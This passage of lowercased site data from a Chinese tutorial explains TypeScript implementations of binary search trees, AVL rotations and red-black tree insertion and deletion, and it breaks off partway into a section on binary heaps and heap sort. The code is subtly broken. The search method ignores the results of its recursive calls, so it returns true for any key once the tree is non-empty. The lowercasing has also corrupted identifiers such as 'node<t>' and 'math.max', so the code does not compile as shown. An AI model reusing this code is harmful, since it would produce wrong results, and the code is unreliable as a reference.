需要准备一个助手类node，它有三个属性key、right、left，分别存储的是节点的值、节点的左侧子节点引用、节点的右侧子节点引用。\n\n    给binarysearchtree声明一个变量_root，代表根节点，类型就是之前的node。再声明一个变量_comparefn，用于存储比较函数。\n\n\n# 二叉搜索树的插入元素\n\n    insert向树中插入一个新的键。如果_root为null，证明此树为空，那么将新元素插入_root；否则，会与_root的值用_comparefn比较大小，比_root小的话再看_root的左侧子节点是否为空，为空就插入这个位置，不然又重复之前的逻辑比较大小...比_root大的话再看_root的右侧子节点是否为空，为空就插入这个位置，不然又重复之前的逻辑比较大小...这一样以来，完全可以用递归来实现它。\n\n/**\n * 向树中插入一个新的键\n */\npublic insert(key: t) {\n    if (this._root == null) { // 根节点为空\n        this._root = new node<t>(key);\n    } else { // 插入到非根节点处需要比较大小才能插入\n        this.insertnode(this._root, key);\n    }\n}\n/**\n * 插入一个节点的左侧还是右侧，用比较函数来比较\n */\nprivate insertnode(node: node<t>, key: t) {\n    if (this._comparefn(key, node.key) === compare.less_than) { // 第一个参数小于第二个参数\n        if (node.left == null) {\n            node.left = new node<t>(key);\n        } else {\n            this.insertnode(node.left, key);\n        }\n    } else {\n        if (node.right == null) {\n            node.right = new node<t>(key);\n        } else {\n            this.insertnode(node.right, key);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 二叉搜索树的遍历\n\n# 中序遍历\n\n    中序遍历是一种上行顺序访问bst所有节点，也就是以“左侧子节点——父节点——右侧子节点”这样的形式遍历。\n\n/**\n * 通过中序遍历方式遍历所有节点\n */\npublic inordertraverse(callback: function) {\n    this.inordertraversenode(this._root, callback);\n}\n/**\n * 中序遍历\n */\nprivate inordertraversenode(node: node<t>, callback: function) {\n    if (node != null) {\n        this.inordertraversenode(node.left, callback);\n        callback(node); // 在父节点就调用\n        this.inordertraversenode(node.right, callback);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 先序遍历\n\n    先序遍历是先访问该节点再访问其后代节点的顺序来遍历bst所有节点，也就是以“父节点——左侧子节点——右侧子节点”这样的形式遍历。\n\n/**\n * 通过先序遍历方式遍历所有节点\n */\npublic preordertraverse(callback: function) {\n    this.preordertraversenode(this._root, callback);\n}\n/**\n * 先序遍历\n */\nprivate preordertraversenode(node: node<t>, callback: function) {\n    if (node != null) {\n        callback(node); // 在左节点之前就调用\n        this.preordertraversenode(node.left, callback);\n        this.preordertraversenode(node.right, callback);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 后序遍历\n\n    后序遍历是先访问后代节点再访问该节点的顺序来遍历bst所有节点，也就是以“左侧子节点——右侧子节点——父节点”这样的形式遍历。\n\n/**\n * 通过后序遍历方式遍历所有节点\n */\npublic postordertraverse(callback: function) {\n    this.postordertraversenode(this._root, callback);\n}\n/**\n * 后序遍历\n */\nprivate postordertraversenode(node: node<t>, callback: function) {\n    if (node != null) {\n        this.postordertraversenode(node.left, callback);\n        this.postordertraversenode(node.right, callback);\n        callback(node); // 在右节点之后就调用\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二叉搜索树的最大值和最小值\n\n# 最大值\n\n    二叉搜索树的最大值就是树的最右侧的叶节点。其实就是从_root开始向右搜索，找到他们最右侧的子节点。\n\n/**\n * 二叉搜索树的最大值\n */\npublic max(): node<t> {\n    return this.maxnode(this._root);\n}\n/**\n * 一直往右搜索找最大值\n */\nprivate maxnode(node: node<t>): node<t> {\n    let current: node<t> = node;\n    while (current != null && current.right != null) {\n        current = current.right;\n    }\n    return current;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 最小值\n\n    二叉搜索树的最小值就是树的最左侧的叶节点。其实就是从_root开始向左搜索，找到他们最左侧的子节点。\n\n/**\n * 二叉搜索树的最小值\n */\npublic min(): node<t> {\n    return this.minnode(this._root);\n}\n/**\n *  一直往左搜索找最小值\n */\nprivate minnode(node: node<t>): node<t> {\n    let current: node<t> = node;\n    while (current != null && current.left != null) {\n        current = current.left;\n    }\n    return current;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二叉搜索树的查找元素\n\n    search，在树中查找一个键。如果节点存在，则返回true，否则返回false。从_root开始，使用_comparefn来比较大小，相等就返回true；比_root小的话，从左边搜索，比_root大的话，从右边搜索。又可以使用递归来解决这个问题。\n\n/**\n * 在树中查找一个键。如果节点存在，则返回true，否则返回false\n */\npublic search(key: t): boolean {\n    return this.searchnode(this._root, key);\n}\n/**\n * 判断当前节点是否与key相等，如果key小于node.key就向左边迭代查找，大于就向右边查找，相等就返回\n */\nprivate searchnode(node: node<t>, key: t): boolean {\n    if (node == null) {\n        return false;\n    }\n    if (this._comparefn(key, node.key) === compare.less_than) { // key比这个node的key小就往左边走\n        this.searchnode(node.left, key);\n    } else if (this._comparefn(key, node.key) === compare.bigger_than) { // key比这个node的key大就往右边走\n        this.searchnode(node.right, key);\n    }\n    return true; // 直到相同就会返回true\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 二叉搜索树的移除元素\n\n    二叉搜索树中最复杂的方法remove，因为我们删除树中的某个节点时，可能还存留有它的子节点和子树，我们要考虑用哪个节点来替代它的位置。\n    当这个节点没有节点或者单纯只有一个子节点时，很好操作，没有子节点就不用管谁来替代它，只有一个子节点时就用这个子节点（包括子树）来替代它。\n    当它同时拥有左侧子节点和右侧子节点时，我们需要找出它右侧子树中最小的节点替代它（也就是值最接近它的节点来替代它）。但问题来了，这个替代的节点可能还有子树，所以我们不能单纯的移过去，需要从这个替代节点的父节点开始往下遍历删除这个替代的节点（也就是再调一次删除方法，来删除这个替代的节点）。     还有一点需要考虑，删除的这个节点，它的父节点里指向子节点的引用（指针）需要更新，因为你用新元素替代了它的子节点而引用还没更新。实现这点的方式就是，每次在替代完后都需要放回这个新节点，在迭代之前就用父节点里对应的引用来接收这个返回。\n\n/**\n * 从移除二叉搜索树中的删除一项\n */\npublic remove(key: t) {\n    this._root = this.removenode(this._root, key); // 更新根节点\n}\n/**\n * 删除的这项，要考虑它的子节点\n * 如果它的左侧和右侧子节点同时存在就要考虑用谁来替代它原来的位置\n * 目前按照常理，找它后方最接近它的项来替代它的位置，并把“被用来替代的项”也要用removenode删除\n */\nprivate removenode(node: node<t>, key: t): node<t> {\n    if (node == null) {\n        return null;\n    }\n    if (this._comparefn(key, node.key) === compare.less_than) { // key比这个node的key小就往左边走\n        node.left = this.removenode(node.left, key); // 左侧子节点可能会变化，更新左侧子节点的引用（指针）\n        return node; // 更新父节点的引用（指针）\n    } else if (this._comparefn(key, node.key) === compare.bigger_than) { // key比这个node的key大就往右边走\n        node.right = this.removenode(node.right, key); // 右侧子节点可能会变化，更新右侧子节点的引用（指针）\n        return node; // 更新父节点的引用（指针）\n    } else { // 相等\n        // 没有左右侧子节点，直接删除\n        if (node.right == null && node.left == null) {\n            node = null;\n            return node; // 更新父节点的引用（指针）\n        }\n        if (node.right == null) { // 没有右侧子节点，而有左侧子节点，那么将左侧子节点替代它\n            node = node.left;\n            return node; // 更新父节点的引用（指针）\n        } else if (node.left == null) { // 没有左侧子节点，而有右侧子节点，那么将右侧子节点替代它\n            node = node.right;\n            return node; // 更新父节点的引用（指针）\n        }\n        /*\n            * 最特殊的情况，它有左侧子节点也有右侧子节点，删除它的话要选择合适的值替代它\n            * 删除一个值一般都是从后面寻找最接近它的项，在二叉搜索树中最接近节点的项就是它右侧节点中最小的那个\n            * 替代时，那个“被用来替代的项”也要删除，相当于用removenode来迭代删除“被用来替代的项”\n            */\n        const aux: node<t> = this.minnode(node.right);\n        node.key = aux.key; // 先替换这个值，下一步去删除引用\n        node.right = this.removenode(node.right, aux.key); // 从右侧子节点开始删除那个“被用来替代的项”，并更新\n        return node; // 更新父节点的引用（指针）\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 平衡二叉树的实现\n\n    平衡二叉树的实现代码细节：avl-tree.ts\n\n\n# 节点的高度和平衡因子\n\n    节点的高度其实是该节点所形成的子树的高度（而子树的高度是子树上所有节点的深度最大值），一定要与节点的深度区分开来。节点的深度是向上遍历，看有多少层祖先，而节点的高度是向下遍历，看有多少层后代。\n\n    平衡因子是某个节点的左侧子树的高度（左侧子节点的高度）和右侧子树（右侧子节点的高度）的差值，在avl中平衡因子只能是-1, 0, 1超过这些值的话需要旋转平衡。（最快的判断方法就是谁的左右两侧的层数超过了1）\n\n/**\n * 计算节点所在树的高度（从上往下计算）\n */\nprivate getnodeheight(node: node<t>): number {\n    if (node == null) {\n        return -1;\n    }\n    return math.max(this.getnodeheight(node.left), this.getnodeheight(node.right)) + 1;\n}\n/**\n * 计算某个节点的平衡因子\n */\nprivate getbalancefactor(node: node<t>) {\n    // 左侧子树高度减去右侧子树高度\n    const heightdifference = this.getnodeheight(node.left) - this.getnodeheight(node.right);\n    switch (heightdifference) {\n        case -1:\n            return balancefactor.slightly_unbalanced_right; // 平衡因子为1，右侧略微不平衡多1层\n        case 1:\n            return balancefactor.slightly_unbalanced_left; // 平衡因子为1，左侧略微不平衡多1层\n        case -2:\n            return balancefactor.unbalanced_right; // 平衡因子为-2，代表节点的右侧比左侧多2层\n        case 2:\n            return balancefactor.unbalanced_left; // 平衡因子为2，代表节点的左侧比右侧多2层\n        default:\n            return balancefactor.balanced; // 左右完全平衡\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 平衡二叉树的平衡操作\n\n    向avl树添加或移除节点后，需要计算出节点平衡因子，然后根据平衡因子来确定是否需要进行平衡操作。\n\n    新节点插入后，导致某个节点不平衡（平衡因子的绝对值达到了2），会形成了四种情况：\n        1.左-左(ll)：这个新节点是那个不平衡节点的左子树的左子树的叶节点。需要将不平衡节点进行右旋转就可以达到平衡。\n        2.右-右(rr)：这个新节点是那个不平衡节点的右子树的右子树的叶节点。需要将不平衡节点进行左旋转就可以达到平衡。\n        3.右-左(rl)：这个新节点是那个不平衡节点的右子树的左子树的叶节点。需要将不平衡节点的右节点进行右旋转然后将不平衡节点进行左旋转就可以达到平衡。\n        4.左-右(lr)：这个新节点是那个不平衡节点的左子树的右子树的叶节点。需要将不平衡节点的左节点进行左旋转然后将不平衡节点进行右旋转就可以达到平衡。\n\n/**\n * 左-左形式：需要右旋转\n * 将2插到5的左侧子节点，20那个节点将会不平衡，需要将20那\n * 个节点进行右旋转。15那个节点会挡住20那个节点，那么就需\n * 要先将15那个节点放到20那个节点的左侧子节点上，最后将20\n * 这个节点放到10这个节点的右侧子节点上，这样就完成了右旋\n * 转。\n * --------------------------------------------------\n *        20               10\n *       /  \\             /  \\\n *      10   25          5    20\n *     / \\       ——>    /     / \\\n *    5   15           2     15  25\n *   ^\n *  2\n * --------------------------------------------------\n */\nprivate rotationll(node: node<t>): node<t> {\n    // 临时保存不平衡节点的左侧子树\n    const temp = node.left;\n    // node准备右旋转，而temp的right上有多余的节点\n    // 这个多余的节点可以移到node的left上\n    node.left = temp.right;\n    // 完成旋转也就是node会旋转到temp的right上\n    temp.right = node;\n    return temp;\n}\n/**\n * 右-右形式：需要左旋转\n * 将28插到25的右侧子节点，10那个节点将会不平衡，需要将10\n * 那个节点进行左旋转。15那个节点会挡住10那个节点，那么就\n * 需要先将15那个节点放到10那个节点的右侧子节点上，最后将\n * 10这个节点放到20这个节点的左侧子节点上，这样就完成了左\n * 旋转。\n * --------------------------------------------------\n *    10                    20\n *   /  \\                  /  \\\n *  5   20                10   25\n *      / \\       ——>    /  \\    \\\n *     15  25           5   15    28\n *          ^\n *           28\n * --------------------------------------------------\n */\nprivate rotationrr(node: node<t>): node<t> {\n    // 临时保存右侧子树（node.right）\n    const temp = node.right;\n    // node准备左旋转，而temp的left上有多余的节点\n    // 这个多余的节点可以移到node的right上\n    node.right = temp.left;\n    // 完成旋转也就是node会旋转到temp的left上\n    temp.left = node;\n    return temp;\n}\n/**\n * 左-右形式：先需要左旋转最后需要右旋转\n * 将18插到15的右侧子节点，20那个节点将会不平衡，需要将10\n * 那个节点进行左旋转，最后对20那个节点进行右旋转。\n * --------------------------------------------------\n *      20               20              15\n *     /  \\             /  \\            /  \\\n *    10   25          15   25         10   20\n *   / \\       ——>    /  \\      ——>   /    /  \\\n *  5   15           10  18          5    18   25\n *       ^          /\n *        18       5\n * --------------------------------------------------\n */\nprivate rotationlr(node: node<t>): node<t> {\n    // 对不平衡节点的左侧子节点进行左旋转\n    node.left = this.rotationrr(node.left);\n    // 对不平衡节点进行右旋转\n    return this.rotationll(node);\n}\n/**\n * 右-左形式：先需要右旋转最后需要左旋转\n * 将13插到15的左侧子节点，10那个节点将会不平衡，需要将20\n * 那个节点进行右旋转，最后对10那个节点进行左旋转。\n * --------------------------------------------------\n *   10               10                  15\n *  /  \\             /  \\                /  \\\n * 5   20           5   15              10   20\n *     / \\     ——>      / \\     ——>    /  \\    \\\n *    15  25           13  20         5   13   25\n *    ^                     \\\n *   13                      25  \n * --------------------------------------------------\n */\nprivate rotationrl(node: node<t>): node<t> {\n    // 对不平衡节点的右侧子节点进行右旋转\n    node.right = this.rotationll(node.right);\n    // 对不平衡节点进行左旋转\n    return this.rotationrr(node);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n\n\n    可以思考一下，左-右形式的能不能先右旋转再左旋转？右-左形式的能不能先左旋转再右旋转？\n\n/**\n * 左-右形式：先特殊右旋转最后正常左旋转\n * --------------------------------------------------\n *      20            10                 15\n *     /  \\          /  \\               /  \\\n *    10   25       5   15             10   20\n *   / \\       ——>     /  \\    ——>    /    /  \\\n *  5   15            13  20         5    18   25\n *      ^                   \\\n *     13                   25\n * --------------------------------------------------\n */\nprivate specialrotationlr(node: node<t>): node<t> {\n    // 进行特殊右旋转\n    node = this.specialrotationll(node);\n    // 进行正常左旋转\n    return this.rotationrr(node);\n}\nprivate specialrotationrl(node: node<t>): node<t> {\n    // 进行特殊左旋转\n    node = this.specialrotationrr(node);\n    // 进行正常右旋转\n    return this.rotationll(node);\n}\n/**\n * 使用temp.left.left的原因就是，新添的叶节点就在这一层\n * 而且左-右或右-左能保证temp.left不为空，而左-左或右-右\n * 就不能保证temp.left不为空，所以左-左和右-右还是使用的\n * 正常的旋转\n */\nprivate specialrotationrr(node: node<t>): node<t> {\n    const temp = node.right;\n    node.right = temp.left.left;\n    temp.left.left = node;\n    return temp;\n}\nprivate specialrotationll(node: node<t>): node<t> {\n    const temp = node.left;\n    node.left = temp.right.right;\n    temp.right.right = node;\n    return temp;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n    左-右形式的能先右旋转再左旋转；右-左形式的能先左旋转再右旋转。但是没必要，因为这四种情景上有时还得使用正常的旋转，不然它可能会有不平衡的子树。\n\n\n# 自平衡树的插入节点\n\n    依然采用递归方法，去找寻适合的位置去插入，插入后新元素刚好在最底端，利用递归+return形式可以反过来检测元素是否平衡，不平衡再进行平衡操作。\n\n/**\n * 向树中插入一个新的键\n */\npublic insert(key: t) {\n    this._root = this.insertnode(this._root, key);\n}\n/**\n * 插入一个节点的左侧还是右侧，用比较函数来比较\n * 插入后还需要反过来对node进行平衡检查\n */\nprotected insertnode(node: node<t>, key: t) {\n    if (node == null) {\n        return new node<t>(key); // 直接return，新键也不需要对这个键作平衡操作\n    }\n    if (this._comparefn(key, node.key) === compare.less_than) { // key小于node.key\n        node.left = this.insertnode(node.left, key); // 插左边\n    } else if (this._comparefn(key, node.key) === compare.bigger_than) { // key大于node.key\n        node.right = this.insertnode(node.right, key); // 插右边\n    } else { // 键重复，无需插入\n        return node; // 直接return，键重复也不需要对这个键作平衡操作\n    }\n    const balancefactor = this.getbalancefactor(node); // node的平衡因子\n    if (balancefactor === balancefactor.unbalanced_left) { // node不平衡并且属于左边高\n        if (this._comparefn(key, node.left.key) === compare.less_than) { // 新键在node的左子树的左子树上\n            node = this.rotationll(node);\n        } else { // 新键在node的左子树的右子树上\n            node = this.rotationlr(node);\n        }\n    } else if (balancefactor === balancefactor.unbalanced_right) { // node不平衡并且属于右边高\n        if (this._comparefn(key, node.right.key) === compare.bigger_than) { // 新键在node的右子树的右子树上\n            node = this.rotationrr(node);\n        } else {\n            node = this.rotationrl(node);\n        }\n    }\n    return node; // 迭代结合return，反过来对每次的node进行平衡检查\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 自平衡树的移除节点\n\n    在父类的删除基础上添加平衡操作的逻辑。其实跟添加的逻辑也很类似，区别比较大的是在判断是单旋双旋上，新增可以拿新增元素和node的子节点比较，而删除需要判断node的子节点平衡因子来作判断。\n\n/**\n * 删除元素，重写父类的同名方法，会用到父类的逻辑再新增平衡操作的逻辑\n * 特殊之处：子类super调用父类同名方法，并且父类的那个方法递归调用自身。\n * 调用顺序就是子类removenode方法——>父类removenode方法——>递归调用子类\n * removenode方法——>父类removenode方法——>递归调用子类的removenode方法，\n * 循环调用至边界条件。\n */\nprotected removenode(node: node<t>, key: t) {\n    node = super.removenode(node, key);\n    if (node == null) {\n        return node; // 空的null不需要平衡\n    }\n    const balancefactor = this.getbalancefactor(node);\n    if (balancefactor === balancefactor.unbalanced_left) { // 左子树不平衡\n        // 左子树的左节点的平衡因子，如果这个平衡因子是0或者1，代表左子树是左-左型\n        const balancefactorleft = this.getbalancefactor(node.left);\n        if (balancefactorleft === balancefactor.balanced ||\n            balancefactorleft === balancefactor.slightly_unbalanced_left) {\n            node = this.rotationll(node);\n        } else if (balancefactorleft === balancefactor.slightly_unbalanced_right) {\n            node = this.rotationlr(node);\n        }\n    } else if (balancefactor === balancefactor.unbalanced_right) { // 右子树不平衡\n        // 右子树的右节点的平衡因子，如果这个平衡因子是0或者1，代表右子树是右-右型\n        const balancefactorright = this.getbalancefactor(node.right);\n        if (balancefactorright === balancefactor.balanced ||\n            balancefactorright === balancefactor.slightly_unbalanced_right) {\n            node = this.rotationrr(node);\n        } else if (balancefactorright === balancefactor.slightly_unbalanced_left) {\n            node = this.rotationrl(node);\n        }\n    }\n    return node;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n非常推荐去看一下avl树的测试代码avl-tree.spec.ts，就算不运行它，也可以看一下里面的注释，包含avl插入删除元素的实际例子推算！\n\n\n# 红黑树的实现\n\n    红黑树的实现代码细节：red-black-tree.ts\n\n    首先我们要明确红黑树的性质：\n        1.每个节点非黑即红\n        2.根节点是黑色的\n        3.空的叶节点都是黑色的\n        4.如果一个节点是红色的，那么它的父节点和子节点就只能是黑色的，也就是不能有连续的红色节点。\n        5.任意节点到它后代的叶节点的所有路径上，拥有相同数量的黑色节点。\n\n        对第3点解释一下，例如某个值为9的节点没有左子节点，其实9这个节点的左子节点就是个空节点也就是null（有些语言用nil描述的）；那么这个空节点相对于树来说就是空的叶节点。\n\n\n# 红黑树的插入节点\n\n    首先先规定新插入的元素是 红色 ，插入时可分为以下几个场景：\n场景1：红黑树是空树，新元素放到root上，其颜色置为黑色。\n场景2：插入的元素已经存在于红黑树了，不用插入该元素。\n场景3：新插入元素的父节点是黑色的，那么直接插入，无需进行红黑平衡。 违反性质5吗？没有，因为新插入的红色节点根本就不影响路径上黑色的数量。例如下图：新添元素9\n\n场景4：新插入元素的父节点是红色，违反性质4，需要进行红黑平衡。\n\n> 场景4.1：叔节点不存在。 先明确一下，新元素是红色，父节点是红色，那么祖父节点就是黑色，相应的这棵子树对外暴露的是黑色。例如下图：新添元素4，并且没有叔节点\n> \n>      方法一：采用对换颜色的方法，将父节点和祖父节点的颜色对调，那新子树对外暴露的是红色节点，这样可能会违反性质4，如果继续对换新的父节点和新的祖父节点的颜色，又违反性质5。例如下图：6和8颜色对换，但是8和10是连续的红色，违反性质4；10和12继续对换，又潍坊性质5.\n> \n>      方法二： 其实叔节点为空就类似avl不平衡场景，那么需要根据对应的情景进行对应的旋转，还要保证旋转前后的顶点颜色要不变（对调父节点和祖父节点的颜色）。这样得到的子树对外暴露的依然是黑色节点，不违反性质4和性质5。例如下面4个图：分别是左-左、左-右、右-右、右-左\n> \n> 场景4.2：叔节点存在并且为红色。 按照以往的经验，直接去旋转再变换颜色。例如下图：最终不管是变色还是10和12都置为黑色，都无法同时满足性质4和性质5\n> \n> 所以直接将叔节点这一代与祖父节点对调颜色\n> \n> 场景4.3：叔节点存在并且为黑色。 这个情况比较特殊，它在进行一次平衡后要进行第二次平衡时才可能出现。而解决这种场景的方法，单纯要调换颜色不行还需要旋转才可以，例如下图：\n> \n> 不要认为就一种，其实跟4.1场景的第二种方法一样有四种也就是左-左、左-右、右-右、右-左情形。\n\n纵观这几个场景，其实可以整合一下。\n    叔节点存在并且为红色，直接对调父节点这一代和祖父节点的颜色。这课子树是平衡了，但祖父节点相对于其他子树可能还不平衡，需要将视角调到祖父节点上，然后继续检查是否平衡。\n    叔节点不存在或者叔节点存在并且为黑色，这两种场景的处理逻辑是一样的，先对调颜色，再进行旋转。这课子树是平衡了，并且相对于其他子树也是平衡的，不需要再继续检查平衡了。\n\n    文字和图可能还不懂，需要阅读实现代码red-black-tree.ts的insert方法，并且配上测试代码red-black-tree.spec.ts一起阅读最好。\n\n\n# 红黑树的移除节点\n\n    先不忙讨论黑红树的移除，先回顾一下 二叉树的移除 。二叉树的移除最后归结为三种情形：\n    情形1： 待删除节点下没有子节点，那么删除它以后，没有节点可以补上它的位置。\n    情形2： 待删除节点下只有一个子节点，那么删除它以后，那个子节点会补上它的位置。\n    情形3： 待删除节点下同时拥有左右子节点，那么删除它以后，会从右子树中找最小值节点补上它的位置，并会从右子树中删除那个最小值节点，这又会是新一轮删除（递归），但它有边界条件，它最终还是会落到前两种情形里。\n\n----------------------------------------\n\n    红黑树既然是继承自二叉树，那么它移除节点时也是上述三种情形，只是我们需要结合 红黑树的性质 来讨论。\n\n>     情形1： 待删除节点下没有子节点，那么删除它以后，没有节点可以补上它的位置。\n> \n> >     待删除节点可以是黑色也可以是红色。\n> >     如果是红色，删除时不会导致红黑树失衡；如果是黑色，删除时会导致红黑树失衡。\n> > 如下图：17、13被删除\n> \n>     情形2： 待删除节点下只有一个子节点，那么删除它以后，那个子节点会补上它的位置。\n> \n> >     由于只有一个子节点，根据红黑树性质5，这个子节点必然是红色的；又结合性质4，待删除节点必然是黑色的，并且那个红色子节点也必然没有后代。\n> >     删除时，红色子节点会补到被删除位置，颜色不变只替换数值，也不会影响平衡。最后再删除那个红色节点，相当于回到了情形1。\n> > 如图：17被删除\n> \n>     情形3： 待删除节点下同时拥有左右子节点，那么删除它以后，会从右子树中找最小值节点补上它的位置（颜色不变只替换数值），并会从右子树中删除那个最小值节点，这又会是新一轮删除（递归），但它有边界条件，它最终还是会落到前两种情形里。\n> 如下图：删除17，18会补上来，最后一轮删除其实就是情形1\n\n    初步结论：红黑树的情形3和情形2最终都会变成情形1，所以只需要研究情形1即可。而情形1中只需要对“待删除节点是黑色”这种情况进行讨论，要怎样处理才能让它恢复红黑平衡。\n\n----------------------------------------\n\n    我们需要对兄弟节点颜色进行分情况讨论，如下图：\n\n\n> 大致思路：\n>     节点删除后，兄弟节点这边会 多一层黑色，正常情况下，我们会先将兄弟节点这边的子节点这一层的 红色节点变为黑色节点，那么就 多出两层黑色的；那么再 将多出的其中一层黑色通过旋转借给删除节点那边，一般就会达到平衡了（新旧顶点颜色要一致）。\n>     但是 如果借过去的是一层红色（兄弟节点是红色）怎么办？不能再用“多出两层黑色”这种办法了，红色的借过去的同时其实兄弟节点的子节点也被借过去了，并且也是比删除节点那边多一层黑色，其实又回到这个问题了！用递归，直到借过去的是黑色就可以平衡了。\n> \n> 看图理解：\n> \n> \n> \n> 归纳总结：\n> \n> > 场景1：红黑树是空树或者找不到要删除的元素，那就无需删除。\n> > 场景2：删除的节点是根节点或者是红色节点，那就直接删除它，无需作红黑平衡。\n> > 场景3：删除的节点是黑色节点，需要作红黑平衡。\n> >     场景3.1：其兄弟节点为黑色，并且兄弟节点有至少一个红色子节点。将其中一个红色子节点变为黑色，对调兄弟节点和父节点的颜色，再旋转黑色借给“轻”的那一边。\n> >     场景3.2：其兄弟节点为黑色，并且兄弟节点下没有子节点或者有两个黑色子节点。如果父节点为红色，直接对调兄弟节点和父节点的颜色。如果父节点为黑色，将兄弟节点变为红色，再以父节点为视角，重复“场景3”的处理。\n> >     场景3.3：其兄弟节点为红色。先旋转，再以新的子树作为视角，重复“场景3”的处理。\n\n----------------------------------------\n\n    文字和图可能还不懂，需要阅读实现代码red-black-tree.ts的remove方法，并且配上测试代码red-black-tree.spec.ts一起阅读最好。\n\n----------------------------------------",charsets:{cjk:!0}},{title:"9.二叉堆和堆排序",frontmatter:{title:"9.二叉堆和堆排序"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/9.%E4%BA%8C%E5%8F%89%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html",relativePath:"book-web/数据结构与算法/9.二叉堆和堆排序.md",key:"v-16e944a9",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/9.%E4%BA%8C%E5%8F%89%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"二叉堆数据结构",slug:"二叉堆数据结构",normalizedTitle:"二叉堆数据结构",charIndex:14},{level:2,title:"二叉堆实现",slug:"二叉堆实现",normalizedTitle:"二叉堆实现",charIndex:219},{level:2,title:"堆排序",slug:"堆排序",normalizedTitle:"堆排序",charIndex:6}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"二叉堆数据结构 二叉堆实现 堆排序",content:"# 二叉堆和堆排序\n\n\n# 二叉堆数据结构\n\n    堆(heap)也就叫二叉堆，是一种完全二叉树。树的每一层（除了最后一层）都有左右子节点，最后一层的叶节点尽可能都是左节点；它要么是最小堆要么是最大堆，最小堆的意思是父节点小于等于左右子节点，最大堆的意思是父节点大于等于左右子节点。\n    二叉堆可以快速找出最大值或最小值，所以常被用于优先队列，也用于堆排序算法。二叉堆同层的大小是不明确的，取决于同层元素插入的先后顺序。\n\n\n\n# 二叉堆实现\n\n    二叉堆实现代码细节：heap.ts\n\n    1.声明一个受保护的变量heap用于存储元素，类型是数组；再声明一个受保护的变量compareFn用于存储比较函数。如果在初始化时，传进来的比较函数是升序，代表这将是一个最小堆，反之比较函数是降序，代表这将是一个最大堆。还有，使用的数组实现的，使用链表比较耗内存。\n\n    2.当前节点与父节点、左右子节点在数组中的关系。左节点：index * 2 + 1；右节点：index * 2 + 2；父节点：Math.floor((index - 1) / 2)。\n\n    3.insert方法，先放在数组最后面，再对它进行上移处理，即与它的父节点比较大小，符合compareFn要求的不会处理，否则就要将父节点与当前节点的值对换。\n\n\n    3.extract方法，移除二叉堆的根节点，也就是最大堆的最大值，最小堆的最小值。用数组末尾的值补上根节点的值，然后进行下移处理，重新梳理二叉树。\n\n\n\n# 堆排序\n\n    堆排序实现代码细节：heap.ts和heap.ts\n\n    1.有一个未经排序的数组，将它构造成一个二叉堆形式的数组。\n    2.将二叉堆的根节点与“末尾”对调，将新的根节点的值进行下移操作，一直对这个值进行下移，直到这个值最终会落到合适的位置；再将二叉堆新的根节点与“末尾减一”对调，重复之前的操作......直到根节点与“末尾减N”重合，最后得出的数组就是一个堆排序后的新数组。\n    最简单的理解其实就是一直调用extract，直到数组为空，真正去实现的时候有细微差别。\n",normalizedContent:"# 二叉堆和堆排序\n\n\n# 二叉堆数据结构\n\n    堆(heap)也就叫二叉堆，是一种完全二叉树。树的每一层（除了最后一层）都有左右子节点，最后一层的叶节点尽可能都是左节点；它要么是最小堆要么是最大堆，最小堆的意思是父节点小于等于左右子节点，最大堆的意思是父节点大于等于左右子节点。\n    